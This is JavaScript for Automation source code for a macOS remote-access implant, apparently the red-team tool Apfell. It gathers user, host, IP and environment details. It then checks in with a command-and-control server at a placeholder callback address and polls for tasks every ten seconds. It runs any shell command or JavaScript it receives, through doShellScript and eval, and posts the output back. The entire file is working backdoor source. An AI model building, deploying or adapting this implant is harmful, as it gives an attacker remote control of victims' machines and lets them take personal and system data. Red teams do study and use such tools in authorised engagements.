ObjC.import('Cocoa');
ObjC.import('Foundation'); //there by default I think, but safe to include anyway
ObjC.import('stdlib');
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;
//--------------IMPLANT INFORMATION-----------------------------------
class implant{
	constructor(){
		this.procInfo = $.NSProcessInfo.processInfo;
		this.hostInfo = $.NSHost.currentHost;
		this.id = -1;
		this.user = ObjC.unwrap(this.procInfo.userName);
		this.fullName = ObjC.unwrap(this.procInfo.fullUserName);
		//every element in the array needs to be unwrapped
		this.ip = ObjC.unwrap(this.hostInfo.addresses); //probably just need [0]
		this.pid = this.procInfo.processIdentifier;
		//every element in the array needs to be unwrapped
		this.host = ObjC.unwrap(this.hostInfo.names); //probably just need [0]
		this.killdate = "";
		//this is a dictionary, but every 'value' needs to be unwrapped
		this.environment = ObjC.unwrap(this.procInfo.environment);
		this.uptime = this.procInfo.systemUptime;
		//every element in the array needs to be unwrapped
		this.args = ObjC.unwrap(this.procInfo.arguments);
		this.payload_type = 'apfell-jxa';	
		this.osVersion = this.procInfo.operatingSystemVersionString;
	}
}
apfell = new implant();
//--------------Basic C2 INFORMATION----------------------------------------
//https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes
class baseC2{
	//To create your own C2, extend this class and implement the required functions
	//The main code depends on the mechanism being C2 with these functions.
	//   the implementation of the functions doesn't matter though
	constructor(interval){
		this.interval = interval; //seconds between callbacks
	}
	getInterval(){
		return this.interval;
	}
	checkin(){
		//check in with c2 server
	}
	getTasking(){
		//reach out to wherever to get tasking
	}
	getConfig(){
		//gets the current configuration for tasking
	}
	postResponse(){
		//output a response to a task
	}
	setConfig(){
		//updates the current configuration for how to get tasking
	}
}
//-------------RESTFUL C2 mechanisms ---------------------------------
class RestC2 extends baseC2{
	constructor(interval, baseurl){
		super(interval);
		this.baseurl = baseurl;
	}
	checkin(ip, pid, user, host){
		//get info about system to check in initially
		//needs IP, PID, user, host, payload_type
		//gets back a unique ID
		var info = {'ip':ip,'pid':pid,'user':user,'host':host,'payload_type':apfell.payload_type};
		//calls htmlPostData(url,data) to actually checkin
		var jsondata = this.htmlPostData("api/v1.0/callbacks/", JSON.stringify(info));	
		apfell.id = jsondata.id;
		return jsondata;
	}
	getTasking(){
		// http://ip/api/v1.0/tasks/callback/{implant.id}/nextTask
		var url = this.baseurl + "api/v1.0/tasks/callback/" + apfell.id + "/nextTask";
		var task = this.htmlGetData(url);
		return JSON.parse(task);
	}
	postResponse(urlEnding, data){
		var jsondata = this.htmlPostData(urlEnding, JSON.stringify(data));
		console.log("returned data: " + JSON.stringify(jsondata));
		return jsondata;
	}
	htmlPostData(urlEnding, sendData){
		while(true){
			try{ //for some reason it sometimes randomly fails to send the data, throwing a JSON error. loop to fix for now
				console.log("posting: " + sendData + " to " + urlEnding);
				var url = this.baseurl + urlEnding;
				//console.log(url);
				var data = $.NSString.alloc.initWithUTF8String(sendData);
				var req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
				req.setHTTPMethod($.NSString.alloc.initWithUTF8String("POST"));
				var postData = data.dataUsingEncodingAllowLossyConversion($.NSString.NSASCIIStringEncoding, true);
				var postLength = $.NSString.stringWithFormat("%d", postData.length);
				req.addValueForHTTPHeaderField(postLength, $.NSString.alloc.initWithUTF8String('Content-Length'));
				req.setHTTPBody(postData);
				var response = Ref();
				var error = Ref();
				var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
				var resp = ObjC.unwrap($.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding));
				console.log(resp);
				var jsondata = JSON.parse(resp);
				return jsondata;
			}
			catch(error){
			}
		}
	}
	htmlGetData(url){
		return ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(url)),$.NSUTF8StringEncoding));
	}
}
C2 = new RestC2(10, "http://CALLBACK_IP_HERE/"); //defaulting to 10 second callbacks
//-------------MAIN EXECUTION LOOP ----------------------------------
C2.checkin(ObjC.unwrap(apfell.ip[0]),apfell.pid,apfell.user,ObjC.unwrap(apfell.host[0]));
shell = function(command){
	response = currentApp.doShellScript(command);
	return response;
}
js = function(command){
	response = eval(command);
	return response;
}
sleepWakeUp = function(t){
	console.log("checking for tasking");
	task = C2.getTasking();
	var command = ObjC.unwrap(task["command"]);
	if(command != "none"){
		var params = ObjC.unwrap(task["params"]);
		console.log(JSON.stringify(task));
		console.log("processing task");
		if(command == "shell"){
			output = shell(params);
		}
		else if(command == "js"){
			output = js(params);
		}
		else if(command == "jsb"){
			output = ObjC.deepUnwrap(js(params));
		}
		else if(command == "exit"){
			throw "exited";
		}
		else {
			output = "command not supported: " + command + " " + params;
		}
		response = {"response": output.toString()};
		console.log(response);
		console.log("posting response"); //tasking needs to give info on how to respond to that task
		C2.postResponse("api/v1.0/tasks/" + task.id, response);
		task["command"] = "none"; //reset just in case something goes weird
	}
};
//https://stackoverflow.com/questions/37834749/settimout-with-javascript-for-automation
timer = $.NSTimer.scheduledTimerWithTimeIntervalRepeatsBlock(C2.interval, true, sleepWakeUp);
$.NSRunLoop.currentRunLoop.addTimerForMode(timer, "timer");
$.NSRunLoop.currentRunLoop.runModeBeforeDate("timer", $.NSDate.distantFuture);
//timer.invalidate will cause it to stop triggering